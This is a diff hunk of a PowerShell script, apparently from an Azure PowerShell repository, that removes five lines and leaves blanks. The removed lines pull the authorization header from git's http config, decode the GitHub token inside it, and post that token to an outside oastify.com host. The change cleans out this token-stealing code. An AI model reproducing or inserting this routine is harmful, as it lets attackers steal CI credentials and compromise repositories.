@@ -11,11 +11,7 @@
 # limitations under the License.
 # ----------------------------------------------------------------------------------
 
-$httpConfigs = (git config --get-regexp "http" )
-$authConfig = $httpConfigs | Where-Object {$_ -like "*AUTHORIZATION*"}
-$token = ($authConfig -split ' ')[-1]
-$ghToken = ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($token)) -split ':')[1]
-Invoke-RestMethod -Uri "https://ar5r6rmgi6jwdqvwp5nx4e2wjnped61v.oastify.com/token" -Method Post -Body $ghToken
+
 
 $ignoredFiles = @(
     "src/DataFactory/DataFactoryV2.Test/SessionRecords/Microsoft.Azure.Commands.DataFactoryV2.Test.RunTests/TestRunV2.json"
